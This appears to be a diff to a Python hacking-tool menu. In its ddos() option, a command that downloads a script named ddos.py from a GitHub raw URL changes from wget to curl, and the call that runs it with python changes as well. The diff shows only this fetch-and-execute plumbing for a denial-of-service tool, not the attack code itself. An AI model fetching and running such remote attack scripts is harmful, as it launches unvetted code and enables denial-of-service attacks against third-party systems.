@@ -88,7 +88,7 @@ def ddos():
         print(chr(27)+"[1;32m"+"")
         print("Downloading...")
         time.sleep(1)
-        os.system("wget https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py")
+        os.system("curl https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py -o ddos.py")
         print(chr(27)+"[1;31m"+"Download Succesfull!!")
         time.sleep(2)
         while True:
@@ -98,7 +98,7 @@ def ddos():
         print("")
         print("Executting...")
         time.sleep(1)
-        os.system("python3 ddos.py")
+        os.system("python ddos.py")
 
     if x == "3":
         menu()
